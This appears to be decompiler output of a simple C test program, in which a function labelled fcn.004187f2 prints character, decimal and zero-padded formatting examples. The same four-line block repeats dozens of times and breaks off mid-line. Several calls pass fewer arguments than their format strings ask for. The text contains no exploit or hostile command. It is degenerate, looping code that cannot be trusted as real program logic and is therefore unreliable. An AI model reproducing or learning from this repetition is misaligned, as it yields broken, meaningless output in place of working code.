fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c \\n\", 0x61);\n    fcn.004187f2(\"Decimals: %d %ld\\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with blanks: %10d \\n\", 0x7b9);\n    fcn.004187f2(\"Preceding with zeros: %010d \\n\", 0x7b9);\n    fcn.004187f2(\"Characters: %c %c 